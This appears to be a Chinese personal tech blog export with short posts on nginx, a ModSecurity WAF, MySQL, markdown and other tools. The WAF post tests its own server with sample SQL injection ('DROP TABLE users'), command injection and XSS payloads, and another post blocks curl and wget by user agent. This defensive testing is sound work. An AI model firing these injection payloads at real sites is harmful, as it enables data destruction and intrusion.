<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rename  .txt  .bk *</span><br></pre></td></tr></table></figure>

<p>将txt后缀改为bk后缀。</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.mimvp.com/article/15218.html">参考文章</a></p>
]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>linux shell</tag>
        <tag>批量修改文件后缀</tag>
      </tags>
  </entry>
  <entry>
    <title>modsecurity+nginx组装WAF之配置防护策略</title>
    <url>//posts/ZH-CN/Modsecurity_Nginx_WAF_Rules.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刚刚我们只是完成了WAF的组装和简单测试，接下来，我们针对网站做相应的防护策略。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>日志存放位置：<code>/var/log/modsec_audit.log</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1lb4xzm8j30qd0kp409.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1l3kllpfj311k0k3gnf.jpg" alt="image.png"><br>修改日志存储格式为json：修改配置文件<code>/etc/nginx/modsec/modsecurity.conf</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1lfp6315j30pe0hfjsu.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1lelaj1sj311o0kojuh.jpg" alt="image.png"></p>
<h2 id="防护策略"><a href="#防护策略" class="headerlink" title="防护策略"></a>防护策略</h2><h3 id="下载规则库"><a href="#下载规则库" class="headerlink" title="下载规则库"></a>下载规则库</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># git clone https://github.com/SpiderLabs/owasp-modsecurity-crs.git</span></span><br><span class="line">root@vultr:~<span class="comment"># cp -rf owasp-modsecurity-crs /etc/nginx/modsec</span></span><br></pre></td></tr></table></figure>
<h3 id="设置防护策略"><a href="#设置防护策略" class="headerlink" title="设置防护策略"></a>设置防护策略</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@vultr:~<span class="comment"># cd /etc/nginx/modsec/owasp-modsecurity-crs</span></span><br><span class="line">root@vultr:/etc/nginx/modsec/owasp-modsecurity-crs<span class="comment"># mv crs-setup.conf.example  crs-setup.conf</span></span><br><span class="line">root@vultr:/etc/nginx/modsec/owasp-modsecurity-crs<span class="comment"># cd rules</span></span><br><span class="line">root@vultr:/etc/nginx/modsec/owasp-modsecurity-crs/rules<span class="comment"># mv REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf.example REQUEST-900-EXCLUSION-RULES-BEFORE-CRS.conf</span></span><br><span class="line">root@vultr:/etc/nginx/modsec/owasp-modsecurity-crs/rules<span class="comment"># mv RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf.example RESPONSE-999-EXCLUSION-RULES-AFTER-CRS.conf</span></span><br></pre></td></tr></table></figure>
<p>修改配置文件<code>/etc/nginx/modsec/owasp-modsecurity-crs/crs-setup.conf</code>，将WAF改为拦截模式。<a href="https://blog.gazer.win/essay/modsecurity-nginx-rules-config.html">参考</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1nnunmqdj30lr0kjgo9.jpg" alt="image.png"><br>修改规则配置文件<code>/etc/nginx/modsec/main.conf</code>，注释掉测试的规则，将crs规则加载进去：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># From https://github.com/SpiderLabs/ModSecurity/blob/master/</span><br><span class="line"># modsecurity.conf-recommended</span><br><span class="line">#</span><br><span class="line"># Edit to set SecRuleEngine On</span><br><span class="line">Include &quot;/etc/nginx/modsec/modsecurity.conf&quot;</span><br><span class="line"></span><br><span class="line"># Basic test rule</span><br><span class="line">#SecRule ARGS:testparam &quot;@contains test&quot; &quot;id:1234,deny,status:400&quot;</span><br><span class="line">Include &quot;/etc/nginx/modsec/owasp-modsecurity-crs/crs-setup.conf&quot;</span><br><span class="line">Include &quot;/etc/nginx/modsec/owasp-modsecurity-crs/rules/*.conf&quot;</span><br></pre></td></tr></table></figure>
<p><code>nginx -t</code>检查nginx配置文件成功之后，重启Nginx服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -s relaod</span><br><span class="line">service nginx restart</span><br></pre></td></tr></table></figure>
<h3 id="测试一下，v2ray能不能正常使用"><a href="#测试一下，v2ray能不能正常使用" class="headerlink" title="测试一下，v2ray能不能正常使用"></a>测试一下，v2ray能不能正常使用</h3><p>测试发现，v2ray无法使用了。检查modsecurity的日志，发现v2ray的websocket请求被拦截了（匹配到的规则编号是901001）。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1pf58400j311g0aa779.jpg" alt="image.png"><br>于是我们要对v2ray的websocket请求设置白名单，不匹配901001这条规则。<a href="http://www.modsecurity.cn/practice/post/6.html">设置白名单的方法参考</a>和<a href="http://www.modsecurity.cn/chm/SecRuleRemoveById.html">官方文档</a></p>
<div class="note info">
            <p>解释一下：</p><ul><li>以下的<code>id:1001</code>是我自定义的规则编号</li><li><code>pass</code>指的是对满足这个条件的请求放行</li><li><code>ctl:ruleRemoveById=901001</code>是取消匹配901001这条规则</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SecRule REQUEST_URI &quot;@beginsWith /我的websocket路径&quot; &quot;id:1001,phase:1,pass,nolog,ctl:ruleRemoveById=901001&quot;</span><br></pre></td></tr></table></figure>
          </div>

<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1ovkye37j30v00kkdit.jpg" alt="image.png"></p>
<h3 id="WAF效果测试"><a href="#WAF效果测试" class="headerlink" title="WAF效果测试"></a>WAF效果测试</h3><p><a href="https://discuss.konghq.com/t/modsec-v3-owasp-crs3-on-kong-discussion-guide/5402">测试方法参考</a></p>
<h4 id="拦截SQL注入"><a href="#拦截SQL注入" class="headerlink" title="拦截SQL注入"></a>拦截SQL注入</h4><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:/var/log# curl --request POST   --url https://*.com:*/   --header &#x27;content-type: application/x-www-form-urlencoded&#x27;   --cookie dtCookie=36%24946B53A8A942C3A95C28C4CA0FD72AD2   --data &#x27;item1=a&#x27;\&#x27;&#x27;;DROP TABLE users; SELECT * FROM userinfo WHERE &#x27;\&#x27;&#x27;t&#x27;\&#x27;&#x27; &#x27;</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1mwt513mj311n0ia7a6.jpg" alt="image.png"></p>
<h4 id="拦截命令注入攻击"><a href="#拦截命令注入攻击" class="headerlink" title="拦截命令注入攻击"></a>拦截命令注入攻击</h4><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@vultr:/var/log# curl https://*.com:*?exec=/bin/bash</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1psf3qy2j30r405e0t1.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1pumgbphj312507mtat.jpg" alt="image.png"></p>
<h4 id="拦截XSS"><a href="#拦截XSS" class="headerlink" title="拦截XSS"></a>拦截XSS</h4><p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://*.com:*/?q=flowers+%3Cscript%3Eevil_script()%3C/script%3E</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1pzsen2nj31f60u0mzb.jpg" alt="image.png"><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd1pybbzjhj311p0btadj.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>现在我是开启了所有的规则，因为我不管web的细节功能，只要大概能打开就行，这个自制的WAF，目前我只在乎两点：1. v2ray的使用不能受影响；2. web页面可以打开</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://boke.wsfnk.com/archives/717.html">主要是参考这篇文章</a><br><a href="https://discuss.konghq.com/t/modsec-v3-owasp-crs3-on-kong-discussion-guide/5402">验证WAF效果的方法</a></p>
]]></content>
      <categories>
        <category>Nginx</category>
        <category>Modsecurity</category>
        <category>v2ray</category>
      </categories>
      <tags>
        <tag>modsecurity</tag>
        <tag>nginx</tag>
        <tag>WAF</tag>
        <tag>防护策略</tag>
        <tag>防护日志</tag>
      </tags>
  </entry>
  <entry>
    <title>markdown语法学习-表格、删除线、超链接、底纹</title>
    <url>//posts/ZH-CN/Markdown_Grammer.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>写这博客就用的markdown语法。说语法其实有点过了。就算我没学过markdown语法，也能使用markdown写东西。因为纯txt也属于markdown的一部分语法，哈哈哈。为了排版好看，必要的基本知识还得学。怎么给文字加底纹来强调特定的文字？怎么做超链接，别人点击文字就能访问网址，而不用复制粘贴到浏览器去访问？怎么做出删除线的效果？怎么画一个简单的表格？这些都是基本得不能再基本的语法，学会了，就能装13了，给页面显示效果提升level。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><h3 id="加底纹儿，强调文字"><a href="#加底纹儿，强调文字" class="headerlink" title="加底纹儿，强调文字"></a>加底纹儿，强调文字</h3><p>`` 把需要强调的文字放到这俩反引号中间就行。这个效果：<br><code>love</code><br>好看吧。我很喜欢这个样式，简洁好看，又能突出重点，如果只会加粗显示，就没啥意思，视觉上略逊一筹。</p>
<h3 id="怎么把这个错别字删了"><a href="#怎么把这个错别字删了" class="headerlink" title="怎么把这个错别字删了"></a>怎么把这个错别字删了</h3><p><code>~~ ~~</code> 把需要删除的错别字放到这俩对儿波浪线中间，删除成功！这个效果：<br><del>hate</del><br>冲击力够强的哈，强迫症不喜欢错别字，看到删除线就踏实了* _ *</p>
<h3 id="超链接咋弄"><a href="#超链接咋弄" class="headerlink" title="超链接咋弄"></a>超链接咋弄</h3><p>[文字说明] (访问链接) 方括号把文字说明括起来，圆括号把访问链接括起来，就这么简单，点击文字就直接跳转到链接了。这个效果：<br><a href="https://dana5haw.com">myblog</a></p>
<h3 id="画个表格试试"><a href="#画个表格试试" class="headerlink" title="画个表格试试"></a>画个表格试试</h3><p>| - : 画表格总共就用到这三个符号。举个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">水果 | 蔬菜 | 零食</span><br><span class="line">:-|:-:|-:|  //这是表格格式，:用来表示文字的位置是居中（:-:）、居左（:-）、还是居右（-:），-就是占位符，表示这是个格子，|就代表分界线，俩相邻格子就用这条线隔开</span><br><span class="line">青苹果|西红柿|巧克力</span><br><span class="line">草莓|白菜|辣条</span><br></pre></td></tr></table></figure>
<p>效果这样：</p>
<table>
<thead>
<tr>
<th align="left">水果</th>
<th align="center">蔬菜</th>
<th align="right">零食</th>
</tr>
</thead>
<tbody><tr>
<td align="left">青苹果</td>
<td align="center">西红柿</td>
<td align="right">巧克力</td>
</tr>
<tr>
<td align="left">草莓</td>
<td align="center">白菜</td>
<td align="right">辣条</td>
</tr>
</tbody></table>
<hr>
<h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>还有很多语法，把常用的用熟练了，想使用高阶语法的时候，再去找教程就是了。搜索引擎比大脑稍微好用一点。 </p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://www.jianshu.com/p/191d1e21f7ed">https://www.jianshu.com/p/191d1e21f7ed</a></p>
]]></content>
      <categories>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>markdown语法</tag>
        <tag>markdown画表格</tag>
        <tag>markdown画删除线</tag>
        <tag>markdown做超链接</tag>
        <tag>markdown强调文字</tag>
      </tags>
  </entry>
  <entry>
    <title>mysql架构体系</title>
    <url>//posts/ZH-CN/mysql-framework.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>mysql架构体系。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>mysql架构体系：<br><a href="https://v2ray.dana5haw.com:8008/image/x8Ld"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/image.png" alt="image.png"></a><br>主从复制的原理：<br><a href="https://v2ray.dana5haw.com:8008/image/xpNT"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/imagebc605d58011c55ad.png" alt="imagebc605d58011c55ad.png"></a></p>
<h2 id="原理学习"><a href="#原理学习" class="headerlink" title="原理学习"></a>原理学习</h2><p>看书【sql必知必会】</p>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>架构体系</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx之https302跳转为http怎么办</title>
    <url>//posts/ZH-CN/Nginx_Https_Jump.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天遇到的问题，https的请求经过Nginx反向代理之后，302跳转为了http，导致访问不通，返回400。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcr73w1l7sj31f60u0jtw.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么办"><a href="#怎么办" class="headerlink" title="怎么办"></a>怎么办</h2><p>进一步抓包分析，发现确实是302跳转后的location变成了http。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcr7512csrj31f60u0jue.jpg" alt="image.png"><br>根据高手指点，在nginx配置文件加上这两行代码，就解决了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxy_redirect http:// https://;</span><br><span class="line">proxy_set_header X-Forwarded-Proto https;</span><br></pre></td></tr></table></figure>
<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gcr7822761j30ng0er40u.jpg" alt="image.png"></p>
]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>https302跳转为http</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx反向代理-设置获取用户真实端口</title>
    <url>//posts/ZH-CN/Nginx-get-real-port.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>工作上的需要，nginx作为反向代理，需要获取到用户的源端口，并传递给应用服务器。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么设置"><a href="#怎么设置" class="headerlink" title="怎么设置"></a>怎么设置</h2><p>在nginx配置文件加上这一句即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxy_set_header        X-Real-Port     $remote_port;</span><br></pre></td></tr></table></figure>
<p><a href="https://v2ray.dana5haw.com:8008/image/ZjxH"><img src="https://v2ray.dana5haw.com:8008/images/2020/05/14/image.png" alt="image.png"></a></p>
]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx反向代理</tag>
        <tag>获取用户真实端口</tag>
      </tags>
  </entry>
  <entry>
    <title>navicat连接mysql数据库并且向数据库导入sql文件</title>
    <url>//posts/ZH-CN/navicat-mysql-import-sqlfile.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>数据库存储了许多数据，我们需要一个工具界面化显示数据库的数据内容，比如navicat。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="navicat连接数据库"><a href="#navicat连接数据库" class="headerlink" title="navicat连接数据库"></a>navicat连接数据库</h2><p><a href="https://v2ray.dana5haw.com:8008/image/xsYZ"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/image12c2836ab10f5d27.png" alt="image12c2836ab10f5d27.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/xuSi"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/image00776712af9a5b29.png" alt="image00776712af9a5b29.png"></a></p>
<h2 id="新建数据库并导入sql文件"><a href="#新建数据库并导入sql文件" class="headerlink" title="新建数据库并导入sql文件"></a>新建数据库并导入sql文件</h2><p>我需要将外部的数据表导入至本机数据库，首先要新建数据库，之后就可以导入外部sql文件了。</p>
<ul>
<li>新建数据库<br><a href="https://v2ray.dana5haw.com:8008/image/x2tn"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/imagea3bc8c3f95a9c498.png" alt="imagea3bc8c3f95a9c498.png"></a><br>选择字符集：<br><a href="https://v2ray.dana5haw.com:8008/image/xbAV"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/image1ad135b5a44ab0e1.png" alt="image1ad135b5a44ab0e1.png"></a></li>
<li>导入sql文件<br><a href="https://v2ray.dana5haw.com:8008/image/xfOy"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/imageb8eec12f4ab74a70.png" alt="imageb8eec12f4ab74a70.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/xqPA"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/08/image68541a45299ea4a4.png" alt="image68541a45299ea4a4.png"></a></li>
</ul>
]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>navicat</tag>
        <tag>导入sql文件</tag>
      </tags>
  </entry>
  <entry>
    <title>onedrive的隐藏功能-pdf快速转换为word</title>
    <url>//posts/ZH-CN/onedrive-pdf-convert-word.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无意间发现了onedrive的一个隐藏功能，登录到onedrive的web端，我们可以把pdf直接转换为word。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h2><p>方法很简单，登录到onedrive的web端，打开pdf文件，选择【打开桌面应用编辑】即可。<br><a href="https://v2ray.dana5haw.com:8008/image/gm5T"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/image.png" alt="image.png"></a><br><a href="https://v2ray.dana5haw.com:8008/image/gM3l"><img src="https://v2ray.dana5haw.com:8008/images/2020/04/03/imaged9c69ae08d871972.png" alt="imaged9c69ae08d871972.png"></a></p>
<h2 id="后来"><a href="#后来" class="headerlink" title="后来"></a>后来</h2><p>后来我发现word可以直接打开pdf文件，直接进行编辑……我记得以前把pdf转为word还要买wps的会员。不过已经很久没有使用wps了，不知道现在还是不是这样。</p>
]]></content>
      <categories>
        <category>onedrive</category>
      </categories>
      <tags>
        <tag>onedrive</tag>
        <tag>pdf转换为word</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx反向代理设置禁止curl和wget</title>
    <url>//posts/ZH-CN/Nginx_Ban_Curl_Wget.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>不让客户端使用curl或者wget访问nginx代理的网站。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h2><p>原理就是通过User-Agent字段识别出用户的访问方式，比如客户端使用curl或者wget，User-Agent字段就有对应的标识。要禁止客户端curl或者wget，nginx禁止UA字段匹配了curl和wget的请求就行了。</p>
<ul>
<li>禁止一个UA</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if ($http_user_agent ~* (curl)) &#123;</span><br><span class="line">    return 404;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>禁止多个UA</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">if ($http_user_agent ~* (wget|curl)) &#123;</span><br><span class="line">    return 404;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="http://www.ttlsa.com/nginx/how-to-block-user-agents-using-nginx/">http://www.ttlsa.com/nginx/how-to-block-user-agents-using-nginx/</a></p>
]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx反向代理</tag>
        <tag>禁止curl</tag>
        <tag>禁止wget</tag>
      </tags>
  </entry>
  <entry>
    <title>phantomjs安装教程</title>
    <url>//posts/ZH-CN/Install_Phantomjs.html</url>
    <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>官网在国内的网速比龟速还慢，所以在淘宝镜像下载安装包，<a href="https://npm.taobao.org/mirrors/phantomjs">下载链接</a>这里，选择最新版本下载。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw5bftxovj31f60u00y0.jpg" alt="image.png"></p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h2><p>将安装包解压，并且把bin目录的路径设置到环境变量。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw5d2hy20j30re0783yn.jpg" alt="image.png"></p>
<h2 id="查看安装是否成功"><a href="#查看安装是否成功" class="headerlink" title="查看安装是否成功"></a>查看安装是否成功</h2><p>在bin目录开启powershell命令行，输入<code>.\phantomjs.exe --version</code>，能返回版本号，说明安装成功。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gbw5er75ezj30xz0fhgm7.jpg" alt="image.png"></p>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="https://blog.csdn.net/qq_26718271/article/details/55046198">https://blog.csdn.net/qq_26718271/article/details/55046198</a></p>
]]></content>
      <categories>
        <category>安装教程</category>
      </categories>
      <tags>
        <tag>安装教程</tag>
        <tag>phantomjs</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx反向代理upstream配置backup的方法</title>
    <url>//posts/ZH-CN/Nginx_Upstream_Backup.html</url>
    <content><![CDATA[<h2 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h2><p>nginx作为反向代理，需要设置两个后端服务器（backend），其中一台backend作为备机（backup），另外一台backend作为24小时在线的小贴心，只有这台backend不小心挂了，才由备机接管服务。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="配置方法"><a href="#配置方法" class="headerlink" title="配置方法"></a>配置方法</h2><ul>
<li>upstream配置<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream backend &#123;</span><br><span class="line">    server IP:port max_fails=3 fail_timeout=30s;</span><br><span class="line">    server IP:port max_fails=3 fail_timeout=30s backup;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>server配置</li>
</ul>
<ol>
<li>nginx与后端通过http协议通信<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen                             port;</span><br><span class="line">    server_name                        hostname;</span><br><span class="line">    </span><br><span class="line">    proxy_set_header Host $http_host;</span><br><span class="line">    proxy_set_header    X-Forwarded-For   $proxy_add_x_forwarded_for;</span><br><span class="line"></span><br><span class="line">    location / &#123;</span><br><span class="line">        proxy_pass http://backend;  //nginx与后端通过http协议通信</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>nginx与后端通过https协议通信<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen                             port;</span><br><span class="line">server_name                        hostname;</span><br><span class="line">ssl                                on;</span><br><span class="line">ssl_ciphers                        ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA:DES-CBC3-SHA:HIGH:!aNULL:!eNULL:!EXPORT:!CAMELLIA:!DES:!MD5:!PSK:!RC4;</span><br><span class="line">ssl_certificate                    /etc/nginx/server.pem;</span><br><span class="line">ssl_certificate_key                /etc/nginx/server.key;</span><br><span class="line">ssl_dhparam                        /etc/nginx/dhparams.pem;</span><br><span class="line">ssl_protocols                      TLSv1 TLSv1.1 TLSv1.2;</span><br><span class="line">ssl_prefer_server_ciphers          on;</span><br><span class="line"></span><br><span class="line">proxy_set_header Host $http_host;</span><br><span class="line">proxy_set_header    X-Forwarded-For   $proxy_add_x_forwarded_for;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">    proxy_pass https://backend; //nginx与后端通过https协议通信</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2></li>
</ol>
<ul>
<li>ip_hash策略用于均衡负载，根据用户的源IP分发流量到各个backend。比如我（我的IP是个特定值）的第一个http请求到了backend1，nginx会记住我的选择，以后凡是我发起的请求，都将转发到backend1。这种方式常用于做会话保持。</li>
<li>ip_hash策略可以搭配down使用。也就是可以设置永久移除某个backend。比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream backend &#123;</span><br><span class="line">    ip_hash;    //负载均衡策略</span><br><span class="line">    server IP:port max_fails=3 fail_timeout=30s;</span><br><span class="line">    server IP:port max_fails=3 fail_timeout=30s down;   //永久移除该backend，nginx不会把流量转发到该backend。down就是把它打入冷宫。</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>ip_hash策略可以搭配weight使用，设置各个backend的权重值。就是给后宫娘娘们排个头衔，皇后的地位就比妃嫔的地位高。比如：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upstream backend &#123;</span><br><span class="line">    ip_hash;    //负载均衡策略</span><br><span class="line">    server IP:port max_fails=3 fail_timeout=30s weight=6; //这个是皇后，位高权重</span><br><span class="line">    server IP:port max_fails=3 fail_timeout=30s weight=3; //这个是普通妃嫔，权重一般</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这个例子中，皇后和普通妃嫔的权重比是6:3。如果我发起了9次请求，其中6次请求会转发给皇后，其中3次请求转发给普通妃嫔。虽然权重差距大，还是雨露均沾的。</li>
</ul>
<h2 id="参考博文"><a href="#参考博文" class="headerlink" title="参考博文"></a>参考博文</h2><p><a href="http://www.nginx.cn/5130.html">http://www.nginx.cn/5130.html</a></p>
]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>upstream配置backup</tag>
      </tags>
  </entry>
  <entry>
    <title>powershell查看文件的MD5值</title>
    <url>//posts/ZH-CN/powershell-file-md5.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下载大文件之后，怎么确认这个文件是否完整可用？对比md5值即可，md5值和下载源给出的一致就说明文件完整可用。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="certutil查看文件md5值"><a href="#certutil查看文件md5值" class="headerlink" title="certutil查看文件md5值"></a>certutil查看文件md5值</h2><p>语法：<br><code>certutil.exe -hashfile [文件名] MD5</code></p>
]]></content>
      <categories>
        <category>powershell</category>
      </categories>
      <tags>
        <tag>powershell</tag>
        <tag>查询md5值</tag>
      </tags>
  </entry>
  <entry>
    <title>python和redis的交互</title>
    <url>//posts/ZH-CN/Python_Redis_Trans.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习使用python来操作redis数据库。python3需要先安装redis模块：<code>pip3 install redis</code>。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="python操作redis数据库"><a href="#python操作redis数据库" class="headerlink" title="python操作redis数据库"></a>python操作redis数据库</h2><ul>
<li>基础使用<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@dana:~/python-excercise<span class="comment"># cat redis-practice.py</span></span><br><span class="line"><span class="comment">#! /usr/bin/env python3</span></span><br><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"><span class="comment">#r = redis.Redis(host=&#x27;0.0.0.0&#x27;,port=6379) #打印结果是：b&#x27;test&#x27;</span></span><br><span class="line">r = redis.Redis(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">6379</span>,decode_responses=<span class="literal">True</span>) <span class="comment">#打印结果是：test</span></span><br><span class="line">r.<span class="built_in">set</span>(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.get(<span class="string">&#x27;name&#x27;</span>))</span><br></pre></td></tr></table></figure></li>
<li>使用连接池<ul>
